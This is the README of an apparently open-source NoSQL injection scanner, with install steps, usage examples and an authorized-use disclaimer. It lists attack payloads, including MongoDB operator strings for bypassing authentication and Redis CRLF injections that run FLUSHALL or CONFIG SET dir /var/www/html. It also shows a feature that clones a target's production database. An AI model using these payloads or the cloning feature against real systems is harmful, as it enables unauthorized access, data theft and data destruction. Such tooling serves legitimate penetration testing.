# NoSQL Security Scanner

![Python](https://img.shields.io/badge/Python-3.8+-blue)
![License](https://img.shields.io/badge/License-GPL%20v2-red)
![Databases](https://img.shields.io/badge/Databases-4-orange)

**Production-ready NoSQL injection scanner supporting MongoDB, Redis, Cassandra, and Elasticsearch**

Created by **Regaan** | December 2025

---

## 🚀 Features

- ✅ **Multi-Database Support** - MongoDB, Redis, Cassandra, Elasticsearch
- ✅ **150+ Attack Payloads** - Comprehensive injection testing
- ✅ **Async HTTP Requests** - 10x faster scanning
- ✅ **Database Cloning** - Clone MongoDB databases for analysis
- ✅ **Blind Injection** - Timing-based attack detection
- ✅ **Authentication Bypass** - Test login vulnerabilities
- ✅ **Burp Suite Integration** - Proxy support
- ✅ **HTML Reports** - Professional vulnerability reports
- ✅ **Config Management** - Save and load scanner settings

---

## 📦 Installation

```bash
# Clone repository
git clone https://github.com/noobforanonymous/nosql-scanner.git
cd nosql-scanner

# Install dependencies
pip install -r requirements.txt

# Optional: For database cloning
pip install pymongo
```

---

## 🎯 Quick Start

### MongoDB Scan:
```bash
python nosql_scanner.py https://example.com/api/login mongodb
```

### Redis Scan:
```bash
python nosql_scanner.py https://example.com/api/cache redis
```

### Cassandra Scan:
```bash
python nosql_scanner.py https://example.com/api/query cassandra
```

### Elasticsearch Scan:
```bash
python nosql_scanner.py https://example.com/api/search elasticsearch
```

---

## 📖 Usage Examples

### Example 1: MongoDB Authentication Bypass
```bash
python nosql_scanner.py https://example.com/api/login mongodb
```

**Output:**
```
[*] Starting comprehensive NoSQL scan (mongodb)
[*] Testing MongoDB operator injection...
[!] MongoDB operator injection successful: {"$ne": null}
[*] Testing MongoDB blind injection...
[!] Blind injection detected! Time difference: 5.12s
[+] Scan complete in 8.45s
[*] Found 2 vulnerabilities
[+] HTML report saved to: nosql_report.html
```

### Example 2: Database Cloning
```python
import asyncio
from nosql_scanner import NoSQLScanner

async def clone():
    scanner = NoSQLScanner("mongodb://target.com:27017", "mongodb")
    result = await scanner.clone_mongodb_database("production")
    print(f"Cloned {result['total_documents']} documents!")

asyncio.run(clone())
```

**Output:**
```
[*] Attempting to clone MongoDB database: production
[*] Found 12 collections to clone
[+] ✓ Cloned 1523 documents from users
[+] ✓ Cloned 892 documents from orders
[+] Database cloning complete!
[+] Total documents cloned: 15234
```

---

## 🔍 Supported Databases

### MongoDB
- Operator injection ($ne, $gt, $regex, etc.)
- JavaScript injection ($where)
- Authentication bypass
- Blind injection (timing-based)

### Redis
- Command injection (FLUSHALL, CONFIG, EVAL)
- Direct command execution
- Configuration manipulation

### Cassandra
- CQL injection
- UNION-based attacks
- Keyspace enumeration

### Elasticsearch
- Query manipulation
- Script injection
- Wildcard queries

---

## 📊 Attack Payloads

### MongoDB (23+ payloads):
```json
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "sleep(5000)"}
{"$in": ["admin", "root"]}
```

### Redis (12+ payloads):
```
\n\r\nFLUSHALL\r\n
\n\r\nCONFIG SET dir /var/www/html\r\n
\n\r\nEVAL 'malicious code' 0\r\n
```

---

## 🛠️ Advanced Features

### Database Cloning:
```python
# Clone entire MongoDB database
result = await scanner.clone_mongodb_database("production_db")
```

### Burp Suite Integration:
```python
scanner = NoSQLScanner(
    "https://example.com/api",
    "mongodb",
    proxy="http://127.0.0.1:8080"
)
```

### Configuration Management:
```python
# Save configuration
scanner.save_config("nosql_config.json")

# Load configuration
scanner = NoSQLScanner.load_config("nosql_config.json")
```

---

## 📝 Requirements

- Python 3.8+
- aiohttp
- requests
- pymongo (optional, for database cloning)

---

## 🤝 Contributing

Contributions welcome!

---

## 📜 License

GPL v2

---

## 👤 Author

**Regaan**
- Created: December 2025

---

## 🙏 Credits

Inspired by NoSQLMap and SQLMap projects.

---

## ⚠️ Legal Disclaimer

**IMPORTANT - READ BEFORE USE:**

This tool is designed for **authorized security testing only**.

- ✅ **DO USE** on systems you own
- ✅ **DO USE** with written permission
- ✅ **DO USE** for authorized penetration testing
- ✅ **DO USE** for bug bounty programs (within scope)
- ❌ **DO NOT USE** on systems without permission
- ❌ **DO NOT USE** for illegal activities
- ❌ **DO NOT USE** to cause harm or damage

**All security-related tools, experiments, and research are meant strictly for authorized environments.**

**I do not support or condone illegal use of security tooling.**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom
- Similar laws in other countries

**By using this tool, you agree to use it responsibly and legally.**

The author (Regaan) is not responsible for any misuse or damage caused by this tool.

---

**Happy Hacking! 🎯**
